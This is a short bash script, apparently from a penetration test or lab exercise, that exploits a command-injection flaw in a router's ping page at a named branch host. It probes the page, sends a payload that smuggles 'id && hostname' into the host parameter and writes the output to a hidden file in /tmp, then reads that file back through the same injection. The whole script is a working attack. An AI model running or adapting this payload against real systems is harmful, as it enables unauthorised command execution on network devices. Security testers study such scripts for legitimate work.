#!/bin/bash

BASE_URL="http://edge-rt01.branch.pelican-ins.com:8080/ping?host=127.0.0.1"

echo "=== (a) RECON - Identifying entry point ==="
echo "Checking if ping page is accessible..."
curl -s "${BASE_URL}"
echo -e "\n"

echo "=== (b) FINAL WORKING PAYLOAD ==="
echo "Sending command injection payload..."
curl -s "${BASE_URL};id%20%26%26%20hostname%20%3E%20/tmp/.rex_ci_edge"
echo -e "\n"

echo "=== (c) COMMAND EXECUTION PROOF ==="
echo "Command 'id && hostname' executed on target. Output written to /tmp/.rex_ci_edge"
echo -e "\n"

echo "=== (d) READING FILE BACK THROUGH SAME SERVICE ==="
echo "Reading /tmp/.rex_ci_edge via the ping page..."
curl -s "${BASE_URL};cat%20/tmp/.rex_ci_edge"
echo -e "\n"

echo "=== DONE ==="
